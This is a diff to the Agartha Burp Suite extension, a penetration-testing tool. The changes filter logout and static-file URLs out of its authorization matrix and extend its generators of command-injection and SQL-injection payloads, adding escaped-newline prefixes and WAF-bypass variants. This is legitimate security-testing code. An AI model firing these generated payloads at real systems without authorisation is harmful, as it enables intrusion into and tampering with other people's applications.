@@ -16,7 +16,7 @@ try:
 except:
     print "==== ERROR ====" + "\n\nFailed to load dependencies.\n" +str(sys.exc_info()[1]) +"\n\n==== ERROR ====\n\n"
 
-VERSION = "0.9"
+VERSION = "0.92"
 
 class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
     
@@ -146,29 +146,13 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
             return
         self._tbAuthNewUser.setForeground (Color.black)
 
-        if self.userCount == 0:
-            # header for unauth user
-            unauthHeader = self._tbAuthHeader.getText().split('\n')[0] + "\n" + self._tbAuthHeader.getText().split('\n')[1]
-            for line in self._tbAuthHeader.getText().split('\n')[2:]:
-                if not any(re.findall(r'cookie|token|auth', line, re.IGNORECASE)):
-                    unauthHeader +=  "\n" + line
-                if not line:
-                    break
-            self.userNamesHttpReq[0] = unauthHeader
-        
-        self.userCount = self.userCount + 1
-        self.userNames.append(self._tbAuthNewUser.text)
-        self.userNamesHttpReq.append(self._tbAuthHeader.getText())
-        self.tableMatrix_DM.addColumn(self._tbAuthNewUser.text)
-        self.userNamesHttpUrls.append([])
-
         urlList = []
-        for x in range(0,self.tableMatrix.getRowCount()):
+        for x in range(0, self.tableMatrix.getRowCount()):
                 urlList.append(str(self.tableMatrix.getValueAt(x, 0)))
-        
         for _url in set(self._tbAuthURL.getText().split('\n')):
             _url = _url.strip()
-            if _url and not any(re.findall(r'(log|sign).*(off|out)', _url, re.IGNORECASE)):
+            _ext = os.path.splitext(urlparse.urlparse(_url).path)[1]
+            if _url and not any(re.findall(r'(log|sign).*(off|out)', _url, re.IGNORECASE)) and not any(re.findall(r'^\.(gif|jpg|jpeg|png|css|js|ico|svg|eot|woff|woff2|ttf)$', _ext, re.IGNORECASE)):
                 # ignore logout, signoff, etc. paths
                 if _url not in self.userNamesHttpUrls[self.userCount]:
                     # check first if the url exist in user's url list
@@ -176,21 +160,41 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                     if _url not in urlList:
                         # check table if url exists
                         self.tableMatrix_DM.addRow([_url])
-        
-        self._tbAuthURL.setText("")
-        self._btnAuthRun.setEnabled(True)
-        self._btnAuthReset.setEnabled(True)
-        self._lblAuthNotification.text = self._tbAuthNewUser.text + " added successfully!"
-        self._lblAuthNotification.setForeground (Color.black)
-        self._cbAuthColoring.setEnabled(True)
-        self._cbAuthGETPOST.setEnabled(True)
-        self.tableMatrix.repaint()
-        self.tableMatrix.setSelectionForeground(Color.red)
-        self._customRenderer =  UserEnabledRenderer(self.tableMatrix.getDefaultRenderer(str), self.userNamesHttpUrls)
-        self._customTableColumnModel = self.tableMatrix.getColumnModel()
-        for y in range(0,self.tableMatrix.getColumnCount()):
-            self._customTableColumnModel.getColumn (y).setCellRenderer (self._customRenderer)
 
+
+        if self.tableMatrix_DM.getRowCount() > 0:
+            if self.userCount == 0:
+                # header for unauth user
+                unauthHeader = self._tbAuthHeader.getText().split('\n')[0] + "\n" + self._tbAuthHeader.getText().split('\n')[1]
+                for line in self._tbAuthHeader.getText().split('\n')[2:]:
+                    if not any(re.findall(r'cookie|token|auth', line, re.IGNORECASE)):
+                        unauthHeader +=  "\n" + line
+                    if not line:
+                        break
+                self.userNamesHttpReq[0] = unauthHeader
+        
+            self.userCount = self.userCount + 1
+            self.userNames.append(self._tbAuthNewUser.text)
+            self.userNamesHttpReq.append(self._tbAuthHeader.getText())
+            self.tableMatrix_DM.addColumn(self._tbAuthNewUser.text)
+            self.userNamesHttpUrls.append([])
+        
+            self._tbAuthURL.setText("")
+            self._btnAuthRun.setEnabled(True)
+            self._btnAuthReset.setEnabled(True)
+            self._lblAuthNotification.text = self._tbAuthNewUser.text + " added successfully! Possible session terminator (log|sign.*off|out) URLs, and file extensions (gif, jpg, jpeg, png, css, js, ico, svg, eot, woff, woff2, ttf) have been filtered out!"
+            self._lblAuthNotification.setForeground (Color.black)
+            self._cbAuthColoring.setEnabled(True)
+            self._cbAuthGETPOST.setEnabled(True)
+            self.tableMatrix.repaint()
+            self.tableMatrix.setSelectionForeground(Color.red)
+            self._customRenderer =  UserEnabledRenderer(self.tableMatrix.getDefaultRenderer(str), self.userNamesHttpUrls)
+            self._customTableColumnModel = self.tableMatrix.getColumnModel()
+            for y in range(0,self.tableMatrix.getColumnCount()):
+                self._customTableColumnModel.getColumn (y).setCellRenderer (self._customRenderer)
+        else:
+            self._lblAuthNotification.text = "URL list possibly contains session terminators (log|sign.*off|out), or any of file extensions (gif, jpg, jpeg, png, css, js, ico, svg, eot, woff, woff2, ttf)!"
+            self._lblAuthNotification.setForeground (Color.red)
         return
 
     def _cbAuthColoringFunc(self, ev):
@@ -280,19 +284,22 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
 
     def funcCommandInj(self, ev):
         listCommandInj = []        
-        prefixes = ["", "\\n", "\\r\\n", "%0a", "%0d%0a"]
-        escapeChars = ["",  "'", "\\'", "\"", "\\\""]
+        prefixes = ["", "\\n", "\\\\n", "\\r\\n", "\\\\r\\\\n", "%0a", "%0d%0a"]
+        escapeChars = ["",  "'", "\\'", "\\\\'", "\"", "\\\"", "\\\\\""]
         separators = ["&", "&&", "|", "||", ";"]
         
         for prefix in prefixes:
             for separator in separators:
                 for escapeChar in escapeChars:
+                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
+                        if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
+                            continue
                     listCommandInj.append(prefix + escapeChar + separator + self._txtTargetPath.text + separator + escapeChar + "\n")
                     listCommandInj.append(prefix + escapeChar + separator + self._txtTargetPath.text + escapeChar + "\n")
                     listCommandInj.append(prefix + escapeChar + separator + escapeChar + self._txtTargetPath.text + "\n")
                     listCommandInj.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + separator + escapeChar + "\n")
                     listCommandInj.append(prefix + escapeChar + separator + "`" + self._txtTargetPath.text + "`" + escapeChar + "\n")
-                
+
                 listCommandInj.append(prefix + separator + "`" + self._txtTargetPath.text + "`" + separator + "\n")
                 listCommandInj.append(prefix + separator + "`" + self._txtTargetPath.text + "`" + "\n")
             
@@ -403,12 +410,11 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                 return
 
         listSQLi = []
-        prefixes = ["", "\\n", "\\r\\n", "%0a", "0x0a", "%0d%0a", "0x0d0a", "%00", "0x00"]
-        escapeChars = ["", "'", "\\'"]
+        prefixes = ["", "\\n", "\\\\n", "\\r\\n", "\\\\r\\\\n", "%0a", "0x0a", "%0d%0a", "0x0d0a", "%00", "0x00"]
+        escapeChars = ["", "'", "\\'", "\\\\'"]
         if not self._cbSqlWafBypass.isSelected():
             prefixes = [""]
             escapeChars = ["", "'"]
-
         n1 = str(random.randint(10, 70))
         n2 = str(random.randint(71, 99))
         boolExpressions = [n1 + "=" + n1, n1 + "<" + n2]
@@ -420,23 +426,31 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                 for escapeChar in escapeChars:
                     for boolExpression in boolExpressions:
                         for suffix in suffixes[1:]:
+                            if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
+                                    if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
+                                        continue
                             listSQLi.append(prefix + escapeChar + " or " + boolExpression + suffix + "\n")
                             if not escapeChar:
                                 listSQLi.append(prefix + " or " + boolExpression + "\n")
             for prefix in prefixes:
                 for escapeChar in escapeChars[1:]:
                     for suffix in suffixes[1:]:
+                        if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
+                                    if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
+                                        continue
                         listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + "\n")
                         listSQLi.append(prefix + escapeChar + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + suffix + "\n")
                         listSQLi.append(prefix + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + "\n")
                         listSQLi.append(prefix + " or " + escapeChar + "xyz" + escapeChar + "=" + escapeChar + "xyz" + escapeChar + suffix + "\n")
         
-
         if self._cbOrderBased.isSelected():
             for prefix in prefixes:
                 for escapeChar in escapeChars:
                     for suffix in suffixes[1:]:
                         for i in range(int(self._cbOrderDepth.getSelectedItem())):
+                            if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
+                                    if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
+                                        continue
                             listSQLi.append(prefix + escapeChar + " order by " + str(i+1) + suffix + "\n")
                             if not escapeChar:
                                 listSQLi.append(prefix + escapeChar + " order by " + str(i+1) + "\n")
@@ -447,6 +461,9 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                 for escapeChar in escapeChars:
                     for suffix in suffixes[1:]:
                         for union in unions:
+                            if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
+                                    if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
+                                        continue
                             unionPhrase = " union all select "
                             for i in range(int(self._cbUnionDepth.getSelectedItem())):
                                 unionPhrase += union
@@ -518,6 +535,9 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         for prefix in prefixes:
             for escapeChar in escapeChars:
                 for suffix in suffixes[1:]:
+                    if (prefix[:2].count("\\")) and (escapeChar[:2].count("\\")):
+                                    if (prefix[:2].count("\\") != escapeChar[:2].count("\\")):
+                                        continue
                     if self._cbOracleBased.isSelected():
                         if self._cbStackedSQL.isSelected():
                             if escapeChar:
@@ -852,7 +872,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self.editorPaneInfo.setContentType("text/html");
         htmlString ="<html>"
         htmlString +="<div><h3>Author: Volkan Dindar,  Github Repo: https://github.com/volkandindar/agartha</h3>"
-        htmlString +="<h1>Agartha { LFI | RCE | Auth | SQL Injection | Http->Js }</h1>"
+        htmlString +="<h1>Agartha { LFI | RCE | SQLi | Auth | Http->Js }</h1>"
         htmlString +="<p>Agartha is a penetration testing tool which creates dynamic payload lists and user access matrix to reveal injection flaws and authentication/authorization issues. There are many different attack payloads alredy exist, but Agartha creates run-time, systematic and vendor-neutral payloads with many different possibilities and bypassing methods. It also draws attention to user session and URL relationships, which makes easy to find user access violations. And additionally, it converts Http requests to JavaScript to help digging up XSS issues more. In summary:</p><ul>"
         htmlString +="<li><strong>Payload Generator</strong>: It creates payloads/wordlists for different attack types.<ul>"
         htmlString +="<li><strong>Local File Inclusion, Directory Traversal</strong>: It creates file dictionary lists with various encoding and escaping characters.</li>"
@@ -1083,6 +1103,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._requestViewer.setMessage("", False)
         self._responseViewer.setMessage("", False)
         self._lblAuthNotification.text = "Please add users to create an auth matrix"
+        self._lblAuthNotification.setForeground (Color.black)
         self._tbAuthNewUser.setForeground (Color.black)        
         self._txtHeaderDefault = "GET /example HTTP/1.1\nHost: localhost.com\nAccept-Encoding: gzip,deflate\nConnection: close\nCookie: SessionID=......"
         self._tbAuthHeader.setText(self._txtHeaderDefault)
